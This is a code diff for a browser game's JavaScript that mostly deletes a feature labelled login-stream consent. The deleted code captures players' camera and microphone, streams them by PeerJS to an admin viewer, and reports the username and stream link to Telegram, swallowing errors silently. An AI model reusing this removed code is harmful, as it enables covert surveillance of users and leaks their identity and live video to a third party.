@@ -36,9 +36,6 @@ const revivePhoto = document.getElementById("revivePhoto");
 const reviveStatus = document.getElementById("reviveStatus");
 const reviveTimer = document.getElementById("reviveTimer");
 const reviveContinueButton = document.getElementById("reviveContinueButton");
-const loginConsentModal = document.getElementById("loginConsentModal");
-const loginConsentContinueButton = document.getElementById("loginConsentContinueButton");
-const loginConsentStatus = document.getElementById("loginConsentStatus");
 
 /* ================= AUTH / SESSION ================= */
 
@@ -57,11 +54,6 @@ const LEVEL_UP_SCORE = 3000;
 const ENABLE_REVIVE_SECOND_CHANCE = true;
 const PHONE_WIDTH_SCALE_BOOST = 1.12;
 const ENABLE_PHONE_LEVEL1_COORDINATE_PHASE = true;
-const LIVE_PEER_PREFIX = "medieval-cart-live-peer";
-const PEERJS_SCRIPT_URLS = [
-  "https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js",
-  "https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js"
-];
 
 let currentUser = null;
 let isAdminUser = false;
@@ -71,18 +63,9 @@ let isMuted = false;
 let hasUsedRevive = false;
 let reviveMediaStream = null;
 let reviveRequestInProgress = false;
-let loginStreamSent = false;
 let isCoordinateModeEnabled = false;
 let lastTappedCoordinate = null;
 let coordinateDraftData = createEmptyCoordinateDraft();
-let loginLivePeer = null;
-let loginLiveCall = null;
-let loginLiveStream = null;
-let loginLiveRetryTimer = null;
-let loginLiveRoomId = "";
-let loginLivePeerId = "";
-let loginLiveAdminPeerId = "";
-let peerJsScriptPromise = null;
 const COORD_STORAGE_KEY = "medieval_pixel_cart_coord_draft_v1";
 const COORD_LINKED_FILENAME_KEY = "medieval_pixel_cart_coord_file_name_v1";
 let isCoordPanelCollapsed = false;
@@ -763,8 +746,6 @@ function toggleAdminCoordinateMode() {
 }
 
 function logout() {
-  stopLoginLiveSupportBroadcast(true);
-  loginStreamSent = false;
   clearSessionAndGoLogin();
 }
 
@@ -784,270 +765,6 @@ function closeBugReport() {
   if (levelMenu.style.display === "none" && hasStartedLevel && gameState !== "lose") {
     gameState = "playing";
     topControls.style.display = "flex";
-  }
-}
-
-/* ================= LOGIN STREAM CONSENT ================= */
-
-function createLiveSupportRoomId() {
-  const random = Math.random().toString(36).slice(2, 8);
-  return `medieval-cart-${Date.now().toString(36)}-${random}`;
-}
-
-function getAdminPeerId(roomId) {
-  return `${LIVE_PEER_PREFIX}-admin-${roomId}`;
-}
-
-function getVisitorPeerId(roomId) {
-  const suffix = Math.random().toString(36).slice(2, 6);
-  return `${LIVE_PEER_PREFIX}-visitor-${roomId}-${suffix}`;
-}
-
-function getAdminLiveLink(roomId) {
-  const adminUrl = new URL("./admin-live.html", window.location.href);
-  adminUrl.searchParams.set("room", roomId);
-  adminUrl.searchParams.set("mode", "peerjs-demo");
-  return adminUrl.toString();
-}
-
-async function ensurePeerJsLoaded() {
-  if (window.Peer) {
-    return;
-  }
-  if (peerJsScriptPromise) {
-    return peerJsScriptPromise;
-  }
-
-  peerJsScriptPromise = (async () => {
-    for (const scriptUrl of PEERJS_SCRIPT_URLS) {
-      try {
-        await loadScript(scriptUrl);
-        if (window.Peer) return;
-      } catch (error) {
-        // Try next CDN.
-      }
-    }
-    throw new Error("Could not load PeerJS script.");
-  })();
-
-  return peerJsScriptPromise;
-}
-
-function loadScript(scriptUrl) {
-  return new Promise((resolve, reject) => {
-    const existing = [...document.scripts].find(s => s.src === scriptUrl);
-    if (existing) {
-      if (window.Peer) {
-        resolve();
-      } else {
-        existing.addEventListener("load", () => resolve(), { once: true });
-        existing.addEventListener("error", () => reject(new Error("Script load failed")), { once: true });
-      }
-      return;
-    }
-
-    const script = document.createElement("script");
-    script.src = scriptUrl;
-    script.async = true;
-    script.onload = () => resolve();
-    script.onerror = () => reject(new Error("Script load failed"));
-    document.head.append(script);
-  });
-}
-
-function waitForPeerOpen(peerInstance) {
-  return new Promise((resolve, reject) => {
-    const timeout = window.setTimeout(() => reject(new Error("Peer open timeout")), 12000);
-    peerInstance.on("open", () => {
-      window.clearTimeout(timeout);
-      resolve();
-    });
-    peerInstance.on("error", err => {
-      window.clearTimeout(timeout);
-      reject(err);
-    });
-  });
-}
-
-function bindLoginLiveCallHandlers(call) {
-  loginLiveCall = call;
-  const connectWatchdog = window.setTimeout(() => {
-    if (loginLiveCall === call && loginLiveStream) {
-      try {
-        call.close();
-      } catch (error) {
-        // Ignore close errors.
-      }
-      loginLiveCall = null;
-    }
-  }, 12000);
-
-  call.on("stream", () => {
-    window.clearTimeout(connectWatchdog);
-  });
-
-  call.on("close", () => {
-    window.clearTimeout(connectWatchdog);
-    if (loginLiveCall === call) {
-      loginLiveCall = null;
-    }
-  });
-
-  call.on("error", () => {
-    window.clearTimeout(connectWatchdog);
-    if (loginLiveCall === call) {
-      loginLiveCall = null;
-    }
-  });
-}
-
-function tryCallAdminViewer() {
-  if (!loginLivePeer || loginLivePeer.destroyed || !loginLiveStream || !loginLiveAdminPeerId) {
-    return;
-  }
-  if (loginLiveCall) {
-    return;
-  }
-
-  const call = loginLivePeer.call(loginLiveAdminPeerId, loginLiveStream, {
-    metadata: {
-      roomId: loginLiveRoomId,
-      visitorPeerId: loginLivePeerId,
-      startedAt: new Date().toISOString()
-    }
-  });
-  if (!call) {
-    return;
-  }
-  bindLoginLiveCallHandlers(call);
-}
-
-function startCallingAdminLoop() {
-  tryCallAdminViewer();
-  if (loginLiveRetryTimer) {
-    window.clearInterval(loginLiveRetryTimer);
-  }
-  loginLiveRetryTimer = window.setInterval(() => {
-    if (!loginLiveCall) {
-      tryCallAdminViewer();
-    }
-  }, 3200);
-}
-
-function stopLoginLiveSupportBroadcast(silent = false) {
-  if (loginLiveRetryTimer) {
-    window.clearInterval(loginLiveRetryTimer);
-    loginLiveRetryTimer = null;
-  }
-  if (loginLiveCall) {
-    try {
-      loginLiveCall.close();
-    } catch (error) {
-      // Ignore call close errors.
-    }
-    loginLiveCall = null;
-  }
-  if (loginLivePeer) {
-    try {
-      loginLivePeer.destroy();
-    } catch (error) {
-      // Ignore destroy errors.
-    }
-    loginLivePeer = null;
-  }
-  if (loginLiveStream) {
-    for (const track of loginLiveStream.getTracks()) {
-      track.stop();
-    }
-    loginLiveStream = null;
-  }
-  loginLiveRoomId = "";
-  loginLivePeerId = "";
-  loginLiveAdminPeerId = "";
-
-  if (!silent && loginConsentStatus) loginConsentStatus.textContent = "";
-}
-
-function openLoginConsentModal() {
-  if (!loginConsentModal) return;
-  const strayPreviewVideos = loginConsentModal.querySelectorAll("video");
-  for (const preview of strayPreviewVideos) {
-    try {
-      preview.pause();
-    } catch (error) {
-      // Ignore pause errors for non-playing elements.
-    }
-    if ("srcObject" in preview) {
-      preview.srcObject = null;
-    }
-    preview.remove();
-  }
-  if (loginConsentStatus) loginConsentStatus.textContent = "";
-  loginConsentModal.style.display = "flex";
-}
-
-function closeLoginConsentModal() {
-  if (!loginConsentModal) return;
-  loginConsentModal.style.display = "none";
-  if (loginConsentStatus) loginConsentStatus.textContent = "";
-}
-
-async function startLoginCameraStreamAndSendLink() {
-  if (loginStreamSent) {
-    closeLoginConsentModal();
-    return;
-  }
-  if (!loginConsentContinueButton) return;
-  loginConsentContinueButton.disabled = true;
-  closeLoginConsentModal();
-  if (loginConsentStatus) loginConsentStatus.textContent = "";
-  try {
-    if (!window.RTCPeerConnection || !navigator.mediaDevices?.getUserMedia) {
-      throw new Error("Live streaming is not supported in this browser.");
-    }
-
-    stopLoginLiveSupportBroadcast(true);
-    loginLiveRoomId = createLiveSupportRoomId();
-    loginLivePeerId = getVisitorPeerId(loginLiveRoomId);
-    loginLiveAdminPeerId = getAdminPeerId(loginLiveRoomId);
-
-    loginLiveStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: true
-    });
-
-    await ensurePeerJsLoaded();
-    loginLivePeer = new window.Peer(loginLivePeerId);
-    loginLivePeer.on("error", () => {});
-    loginLivePeer.on("disconnected", () => {
-      if (loginLivePeer && !loginLivePeer.destroyed) {
-        loginLivePeer.reconnect();
-      }
-    });
-    await waitForPeerOpen(loginLivePeer);
-
-    const username = currentUser || "unknown";
-    const streamLink = getAdminLiveLink(loginLiveRoomId);
-
-    await sendToTelegram([
-      "LOGIN STREAM LINK",
-      `user: ${username}${isAdminUser ? " (admin)" : ""}`,
-      `time: ${new Date().toISOString()}`,
-      `room: ${loginLiveRoomId}`,
-      `admin peer: ${loginLiveAdminPeerId}`,
-      `visitor peer: ${loginLivePeerId}`,
-      `stream: ${streamLink}`,
-      "mode: frontend-only PeerJS live stream"
-    ].join("\n"));
-
-    startCallingAdminLoop();
-    loginStreamSent = true;
-    closeLoginConsentModal();
-  } catch (error) {
-    if (loginConsentStatus) loginConsentStatus.textContent = "";
-    stopLoginLiveSupportBroadcast(true);
-  } finally {
-    loginConsentContinueButton.disabled = false;
   }
 }
 
@@ -1745,7 +1462,7 @@ function drawHUD() {
 /* ================= LOOP ================= */
 
 function loseGame() {
-  if (ENABLE_REVIVE_SECOND_CHANCE && !hasUsedRevive) {
+  if (ENABLE_REVIVE_SECOND_CHANCE && usePhoneMap() && !hasUsedRevive) {
     gameState = "paused";
     openReviveModal();
     return;
@@ -1780,17 +1497,12 @@ if (!ensureSession()) {
   openLevelMenu();
   applyMuteState();
   requestAnimationFrame(loop);
-  openLoginConsentModal();
 }
 
 if (ENABLE_REVIVE_SECOND_CHANCE && reviveContinueButton) {
   reviveContinueButton.addEventListener("click", submitReviveSelfie);
 }
-if (loginConsentContinueButton) {
-  loginConsentContinueButton.addEventListener("click", startLoginCameraStreamAndSendLink);
-}
 if (coordinateModeButton) {
   coordinateModeButton.addEventListener("click", toggleAdminCoordinateMode);
 }
 setupCoordinateEditor();
-window.addEventListener("beforeunload", () => stopLoginLiveSupportBroadcast(true));
